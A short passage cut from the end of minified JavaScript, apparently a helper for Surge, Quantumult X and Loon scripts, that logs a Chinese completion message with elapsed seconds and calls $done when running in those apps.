`🔔${this.name}, 结束! 🕛 ${s} 秒`), this.log(), (this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t) } }(t, e) }
